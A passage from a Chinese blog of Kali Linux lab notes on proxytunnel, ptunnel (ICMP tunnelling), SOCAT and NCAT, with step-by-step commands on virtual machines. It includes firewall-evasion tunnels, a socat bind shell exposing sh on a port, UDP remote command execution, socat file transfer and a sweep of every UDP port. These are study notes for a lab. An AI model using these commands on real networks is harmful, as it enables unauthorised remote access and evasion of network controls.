-<h4 id="2-实验-1–准备"><a href="#2-实验-1–准备" class="headerlink" title="2. 实验-1–准备"></a>2. 实验-1–准备</h4><ul>
-<li>将外网资源映射为内网指定端口</li>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>bodhi（代理服务器）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-</ul>
-</li>
-<li>PC（bodhi克隆）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/proxytunnel%E5%AE%9E%E9%AA%8C-1.PNG" alt="proxytunnel实验-1"></p>
-<h4 id="3-实验-1"><a href="#3-实验-1" class="headerlink" title="3. 实验-1"></a>3. 实验-1</h4><ul>
-<li>bodhi（代理服务器）<ul>
-<li>浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -&gt; WAN HTTP</li>
-<li>暂时开启mono防火墙默认规则，方便下squid3和proxytunnel</li>
-<li><strong><code>🔺命令：sudo apt-get install squid3</code></strong>（默认所有IP监听3128端口）</li>
-<li><strong><code>🔺命令：vi /etc/squid3/squid.conf</code></strong> ▲ 修改侦听IP，防止公网连接<ul>
-<li>/^http_port → 内网IP:3128</li>
-<li>/^http_access → 修改deny为allow（ports/ssl/all等）</li>
-<li>/^acl → 查看安全策略</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：sudo squid3 -k kill</code></strong>（会自动重启）</li>
-<li><strong><code>🔺命令：netstat -pantu | grep 3128</code></strong>（查看是否限制为监听内网的3128端口）</li>
-</ul>
-</li>
-<li>PC（bodhi克隆）<ul>
-<li><strong><code>🔺命令：sudo apt-get install proxytunnel</code></strong></li>
-</ul>
-</li>
-<li>bodhi（代理服务器）<ul>
-<li>关闭mono防火墙默认规则</li>
-</ul>
-</li>
-<li>PC（bodhi克隆）<ul>
-<li>在无代理的情况下访问外网资源尝试</li>
-<li>设置HTTP proxy → 代理服务器IP:3128，进行访问外网资源尝试</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>开启Web服务</li>
-<li>启动Wireshark抓包</li>
-</ul>
-</li>
-<li>PC（bodhi克隆）<ul>
-<li>访问Kali的Web服务进行尝试</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>查看抓包的数据分析（TCP Stream → Via/X-Fowarded-For会泄露真实IP以及代理IP）</li>
-</ul>
-</li>
-<li>PC（bodhi克隆）<ul>
-<li>关闭代理端口</li>
-<li><strong><code>🔺命令：proxytunnle -a（监听端口）80 -p 代理服务器IP:3128 -d Kali的IP:80</code></strong></li>
-<li>浏览器访问http:127.0.0.1:80进行尝试</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-实验-2–准备"><a href="#4-实验-2–准备" class="headerlink" title="4. 实验-2–准备"></a>4. 实验-2–准备</h4><ul>
-<li>外网资源非防火墙允许端口</li>
-<li>修改目标资源侦听端口可能无法躲避防火墙深层检测（协议检测可发现非80HTTP流量）</li>
-<li>外网安装squid3代理服务器并侦听80端口</li>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>bodhi（代理服务器）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-</ul>
-</li>
-<li>PC（bodhi克隆）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-</ul>
-</li>
-<li>Kali（代理服务器+目标资源）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/proxytunnel%E5%AE%9E%E9%AA%8C-2.PNG" alt="proxytunnel实验-2"></p>
-<h4 id="5-实验-2"><a href="#5-实验-2" class="headerlink" title="5. 实验-2"></a>5. 实验-2</h4><ul>
-<li>bodhi（代理服务器）<ul>
-<li>浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -&gt; WAN HTTP</li>
-<li>暂时开启mono防火墙默认规则，方便下squid3和proxytunnel</li>
-<li><strong><code>🔺命令：sudo apt-get install squid3</code></strong>（默认所有IP监听3128端口）</li>
-<li><strong><code>🔺命令：vi /etc/squid3/squid.conf</code></strong> ▲ 修改侦听IP，防止公网连接<ul>
-<li>/^http_port → 内网IP:3128</li>
-<li>/^http_access → 修改deny为allow（ports/ssl/all等）</li>
-<li>/^acl → 查看安全策略</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：sudo squid3 -k kill</code></strong>（会自动重启）</li>
-<li><strong><code>🔺命令：netstat -pantu | grep 3128</code></strong>（查看是否限制为监听内网的3128端口）</li>
-</ul>
-</li>
-<li>PC（bodhi克隆）<ul>
-<li><strong><code>🔺命令：sudo apt-get install proxytunnel</code></strong></li>
-</ul>
-</li>
-<li>bodhi（代理服务器）<ul>
-<li>关闭mono防火墙默认规则</li>
-</ul>
-</li>
-<li>PC（bodhi克隆）<ul>
-<li>在无代理的情况下访问外网资源尝试</li>
-<li>设置HTTP proxy → 代理服务器IP:3128，进行访问外网资源尝试</li>
-</ul>
-</li>
-<li>Kali（代理服务器+目标资源）<ul>
-<li>关闭apache服务</li>
-<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
-<li><strong><code>🔺命令：vi /etc/squid3/squid.conf</code></strong><ul>
-<li>/^http_port → 本机IP:80</li>
-<li>/^http_access → 修改deny为allow（ports/ssl/all等）</li>
-<li>/^acl → 查看安全策略</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：service squid3 start</code></strong>（netstat -pantu查看）</li>
-<li>开启SSH服务（修改SSH配置文件，netstat -pantu查看）</li>
-<li>开启Wireshark抓包（主要抓取888）</li>
-</ul>
-</li>
-<li>PC（bodhi克隆）<ul>
-<li><strong><code>🔺命令：proxytunnle -a 2222 -p 代理服务器IP:3128 -r Kali的IP:80 -d Kali的IP:22</code></strong></li>
-<li><strong><code>🔺命令：ssh root@127.0.0.1 -p 2222</code></strong>进行连接尝试（密钥交换、输入密码 → ifconfig）</li>
-<li><strong><code>🔺命令：proxytunnle -a 888 -p 代理服务器IP:3128 -r Kali的IP:80 -d 192.168.0.1:80</code></strong></li>
-<li>浏览器访问127.0.0.1:888</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>▲ Wireshark抓包可看出，TCP Stream（tcp.stream eq 0）→ 方法为CONNECT</li>
-</ul>
-</li>
-<li>▲ 2020.2.3数据包能抓到CONNECT的流量，但建立的SSH和HTTP都无法访问，数据包显示为Method Not Allowed方法不允许</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/CONNECT.PNG" alt="CONNECT数据包"></p>
-<h4 id="6-实验-3"><a href="#6-实验-3" class="headerlink" title="6. 实验-3"></a>6. 实验-3</h4><ul>
-<li>ssh客户端配置自动创建代理链隧道</li>
-<li>PC（bodhi克隆）<ul>
-<li><strong><code>🔺命令：sudo vi ~/.ssh/config</code></strong><ul>
-<li>Host Kali的IP </li>
-<li>Hostname Kali的IP</li>
-<li>ProtocolKeepAlives 30 </li>
-<li>ProxyCommand /usr/bin/proxytunnel \</li>
-<li>-p 代理服务器IP:3128 \</li>
-<li>-r Kali的IP:80 -d %h:%p</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：ssh root@Kali的IP -p 22</code></strong></li>
-</ul>
-</li>
-<li>▲ 2020.2.3数据包能抓到CONNECT的流量，但建立的SSH无法访问，数据包显示为Method Not Allowed方法不允许</li>
-</ul>
-<p>![Method Not Allow](/images/kali/kali-notepad/Method Not Allow.PNG)</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%89)%EF%BC%9AICMP%E9%9A%A7%E9%81%93--ptunnel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%89)%EF%BC%9AICMP%E9%9A%A7%E9%81%93--ptunnel/" itemprop="url">Kali Linux笔记(七十三)：ICMP隧道--ptunnel</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-02T20:51:22+08:00">
-                2020-02-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  427 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-ptunnle"><a href="#1-ptunnle" class="headerlink" title="1. ptunnle"></a>1. ptunnle</h4><ul>
-<li>Ping tunnel ICMP隧道工具<ul>
-<li>通过ICMP echo（ping requests，8）和reply（ping reply，0）实现隧道</li>
-<li>适用于防火墙只允许ping出站流量的环境</li>
-<li>支持多并发连接、性能优</li>
-<li>支持身份验证</li>
-<li>需要root权限</li>
-<li>支持抓包<ul>
-<li>Win：winpcap</li>
-<li>Linux：libpcap</li>
-</ul>
-</li>
-<li>工作过程（指定Proxy的时候，需要指定目的地，客户端指定）<ul>
-<li>Proxy、Client、Destination</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>服务器<ul>
-<li><strong><code>🔺命令：ptunnel -x 1234</code></strong>  </li>
-</ul>
-</li>
-<li>客户端<ul>
-<li><strong><code>🔺命令：sudo ptunnel -p proxy -lp 2222 -da destination -dp 22 -x 1234</code></strong>  </li>
-</ul>
-</li>
-<li>嵌套SSH隧道<ul>
-<li><strong><code>🔺命令：ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></strong>  </li>
-</ul>
-</li>
-<li>▲ ptunnel直到目前的最新版仍存在拒绝服务漏洞<ul>
-<li>0.72</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/ptunnle.PNG" alt="ptunnel工作过程"></p>
-<h4 id="2-实验环境准备"><a href="#2-实验环境准备" class="headerlink" title="2. 实验环境准备"></a>2. 实验环境准备</h4><ul>
-<li>Kali（Proxy&amp;Destinatiom）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>Kali（内网）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-<li>浏览器访问mono，检查防火墙规则<ul>
-<li>Protocol → ICMP</li>
-<li>Sourece → LAN subnet</li>
-<li>LAN DNS -&gt; WAM PING</li>
-</ul>
-</li>
-<li>ping/上网尝试</li>
-</ul>
-</li>
-<li>Window XP SP3<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h4><ul>
-<li>Kali（Proxy&amp;Destinatiom）<ul>
-<li>服务器：<strong><code>🔺命令：ptunnel -x 1234</code></strong> </li>
-<li>启动Wireshark抓包，查看发送的数据包内容（ICMP数据包）</li>
-</ul>
-</li>
-<li>Kali（内网）<ul>
-<li><strong><code>🔺命令：sudo ptunnel -h</code></strong> </li>
-<li>客户端：<strong><code>🔺命令：sudo ptunnel -p Kali的IP -lp 2222 -da 192.168.0.1 -dp 80 -x 1234</code></strong>  </li>
-<li>浏览器访问127.0.0.1:2222进行尝试</li>
-</ul>
-</li>
-<li>Kali（Proxy&amp;Destinatiom）<ul>
-<li>开启SSH（修改SSH配置文件）</li>
-</ul>
-</li>
-<li>Kali（内网）<ul>
-<li><strong><code>🔺命令：sudo ptunnel -p Kali的IP -lp 2222 -da Kali的IP -dp 22 -x 1234</code></strong> </li>
-<li><strong><code>🔺命令：ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></strong> </li>
-</ul>
-</li>
-<li>Window XP SP3<ul>
-<li>设置浏览器Internet代理，用内网Kali的IP:7000，上网尝试</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%9A%A7%E9%81%93%E4%BC%A0%E8%BE%93%E5%B7%A5%E5%85%B7--SOCAT/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%9A%A7%E9%81%93%E4%BC%A0%E8%BE%93%E5%B7%A5%E5%85%B7--SOCAT/" itemprop="url">Kali Linux笔记(七十二)：隧道传输工具--SOCAT</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-02T20:48:07+08:00">
-                2020-02-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  763 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-SOCAT"><a href="#1-SOCAT" class="headerlink" title="1. SOCAT"></a>1. SOCAT</h4><ul>
-<li>被称为nc++（增强版的nc）<ul>
-<li>双向数据流通道工具</li>
-</ul>
-</li>
-<li>连接端口<ul>
-<li><strong><code>🔺命令：socat -（标准的输入输出） tcp:1.1.1.1:80（需要连接的目标）</code></strong></li>
-</ul>
-</li>
-<li>侦听端口<ul>
-<li><strong><code>🔺命令：socat - tcp4-listen:22 / socat - tcp-l:33</code></strong></li>
-</ul>
-</li>
-<li>接受文件<ul>
-<li><strong><code>🔺命令：socat tcp4-listen:333 open:2.txt,creat,append</code></strong></li>
-</ul>
-</li>
-<li>发送文件<ul>
-<li><strong><code>🔺命令：cat 1.txt | socat - tcp4:1.1.1.1:333</code></strong></li>
-</ul>
-</li>
-<li>远程shell–服务器端<ul>
-<li><strong><code>🔺命令：socat tcp-l:23 exec:sh,pty,stderr</code></strong> </li>
-</ul>
-</li>
-<li>端口转发<ul>
-<li><strong><code>🔺命令：socat tcp4-listen:22,fork tcp4:1.1.1.1:22</code></strong> </li>
-</ul>
-</li>
-<li>远程执行命令<ul>
-<li>服务器：<strong><code>🔺命令：socat - udp-l:2001</code></strong></li>
-<li>客户端：<strong><code>🔺命令：&quot;</code>id<code>&quot; | socat - udp4-datagram:1.1.1.1:2001</code></strong></li>
-</ul>
-</li>
-<li>UDP全端口任意内容发包<ul>
-<li><strong><code>🔺命令：for PORT in {1..65535}; do echo “aaaaa&quot; | socat - UDP4-DATAGRAM: 1.1.1.1:$PORT; sleep .1; done</code></strong></li>
-</ul>
-</li>
-<li>二进制编辑器<ul>
-<li><strong><code>🔺命令：echo -e &quot;\0\14\0\0\c&quot; | socat -u - file:/usr/bin/ squid.exe,seek,seek=0x00074420</code></strong></li>
-</ul>
-</li>
-<li>简单的WEB服务<ul>
-<li><strong><code>🔺命令：socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:&quot;echo -e \&quot;\\ \&quot;HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\ \nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \ $SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\ \\&quot;\&quot;&quot;</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="2-实验环境准备"><a href="#2-实验环境准备" class="headerlink" title="2. 实验环境准备"></a>2. 实验环境准备</h4><ul>
-<li>Kali<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-TCP连接-侦听端口"><a href="#3-TCP连接-侦听端口" class="headerlink" title="3. TCP连接/侦听端口"></a>3. TCP连接/侦听端口</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：socat - tcp:192.168.0.1:80</code></strong></li>
-<li><strong><code>🔺命令：get / http 1.1/</code></strong></li>
-<li><strong><code>🔺命令：head</code></strong></li>
-<li>侦听端口：<strong><code>🔺命令：socat - tcp4-listen:2222</code></strong>（作为服务器端使用）</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：apt-get install socat</code></strong></li>
-<li><strong><code>🔺命令：socat - tcp:Kali的IP:2222</code></strong></li>
-<li>进行传输数据测试</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-TCP传送-接收文件"><a href="#4-TCP传送-接收文件" class="headerlink" title="4. TCP传送/接收文件"></a>4. TCP传送/接收文件</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：socat tcp4-listen:333 open:2.txt,creat,append</code></strong>（接收文件）</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：echo &quot;asdasdsafasfs&quot; &gt; 1.txt</code></strong></li>
-<li><strong><code>🔺命令：cat 1.txt | socat - tcp4:Kali的IP:333</code></strong>（发送文件）</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-TCP远程Shell–服务器端"><a href="#5-TCP远程Shell–服务器端" class="headerlink" title="5. TCP远程Shell–服务器端"></a>5. TCP远程Shell–服务器端</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：socat tcp-l:23 exec:sh（shell）,pty（终端）,stderr（标准输入输出）</code></strong></li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：socat - tcp:Kali的IP:23</code></strong></li>
-<li><strong><code>🔺命令：id/ifconfig进行测试</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="6-TCP端口转发"><a href="#6-TCP端口转发" class="headerlink" title="6. TCP端口转发"></a>6. TCP端口转发</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：socat tcp4-listen:8080,fork tcp4:192.168.0.1:80</code></strong></li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>浏览器访问Kali的IP:8080</li>
-</ul>
-</li>
-</ul>
-<h4 id="7-UDP远程执行命令"><a href="#7-UDP远程执行命令" class="headerlink" title="7. UDP远程执行命令"></a>7. UDP远程执行命令</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：socat - udp-l:2000</code></strong></li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：echo &quot;</code>id<code>&quot;&quot; | socat - udp4-datagram:Kali的IP:2000</code></strong> </li>
-</ul>
-</li>
-</ul>
-<h4 id="8-UDP全端口任意内容发包（类似全端口扫描）"><a href="#8-UDP全端口任意内容发包（类似全端口扫描）" class="headerlink" title="8. UDP全端口任意内容发包（类似全端口扫描）"></a>8. UDP全端口任意内容发包（类似全端口扫描）</h4><ul>
-<li>Kali<ul>
-<li>Wireshark抓包，过滤UDP数据包</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：for PORT in {1..65535}; do echo &quot;aaaaa&quot; | socat - UDP4-DATAGRAM: Kali的IP地址:$PORT; sleep .1; done</code></strong></li>
-</ul>
-</li>
-<li>▲ 2020.2.2 发送的数据包应用层为ADwin configuration protocol，也为运输层UDP包</li>
-</ul>
-<h4 id="9-二进制编辑器"><a href="#9-二进制编辑器" class="headerlink" title="9. 二进制编辑器"></a>9. 二进制编辑器</h4><ul>
-<li><strong><code>🔺命令：echo -e（使用二进制） &quot;\0\14\0\0\c&quot; | socat -u（单向数据传输） -file:/usr/bin/ squid.exe,seek,seek=0x00074420（偏移量）</code></strong> </li>
-<li>▲ 2020.2.2 未实验，此段代码为一个翻墙软件在Window平台正常启动所需代码，需进行偏移</li>
-</ul>
-<h4 id="10-TCP简单的WEB服务器"><a href="#10-TCP简单的WEB服务器" class="headerlink" title="10. TCP简单的WEB服务器"></a>10. TCP简单的WEB服务器</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:&quot;echo -e \&quot;\\ \&quot;HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\ \nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \ $SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\ \\&quot;\&quot;&quot;&quot;</code></strong></li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>浏览器访问Kali的IP:10081</li>
-<li>字符界面：<strong><code>🔺命令：socat - tcp:Kali的IP:10081</code></strong></li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%80)%EF%BC%9A%E9%9A%A7%E9%81%93%E4%BC%A0%E8%BE%93%E5%B7%A5%E5%85%B7--NCAT/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%80)%EF%BC%9A%E9%9A%A7%E9%81%93%E4%BC%A0%E8%BE%93%E5%B7%A5%E5%85%B7--NCAT/" itemprop="url">Kali Linux笔记(七十一)：隧道传输工具--NCAT</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-02T20:44:26+08:00">
-                2020-02-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  235 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-NCAT"><a href="#1-NCAT" class="headerlink" title="1. NCAT"></a>1. NCAT</h4><ul>
-<li>被称为众多NC衍生版软件中最优的选择</li>
-<li>代理功能（如果不指定端口，默认为31337）<ul>
-<li><strong><code>🔺命令：ncat -l 8080 --proxy-type http --proxy-auth user:pass</code></strong></li>
-<li>浏览器设置代理服务器127.0.0.1:31337，进行网页访问</li>
-</ul>
-</li>
-<li>Broke中介功能<ul>
-<li>AB不同但AC、BC互通</li>
-<li>服务器：<strong><code>🔺命令：ncat -l 333 --broke</code></strong></li>
-<li>客户端之间：发送任何信息都会被hub到其他客户端</li>
-<li>批量执行命令：<strong><code>🔺命令：ncat 1.1.1.1 --sh-exec &quot;echo</code>pwd<code>&quot;</code></strong></li>
-<li>批量传文件：<strong><code>🔺命令：ncat --send-only 1.1.1.1 &lt; inputfile</code></strong></li>
-</ul>
-</li>
-<li>实验（Kail上的三个终端窗口进行模拟）<ul>
-<li>1：<strong><code>🔺命令：ncat -l 333 --broke</code></strong></li>
-<li>2/3：<strong><code>🔺命令：ncat localhost 333</code></strong></li>
-<li>2：<strong><code>🔺命令：aaa</code></strong> → 3收得到信息</li>
-<li>3：<strong><code>🔺命令：bbb</code></strong> → 2收得到信息</li>
-<li>2：<strong><code>🔺命令：ncat 127.0.0.1 333 --sh-exec &quot;echo</code>pwd<code>&quot; → 3</code></strong>进行pwd系统指令操作</li>
-<li>3：<strong><code>🔺命令：ncat --send-only 127.0.0.1 333 &lt; a.php</code></strong> → 2收到a.php文件</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
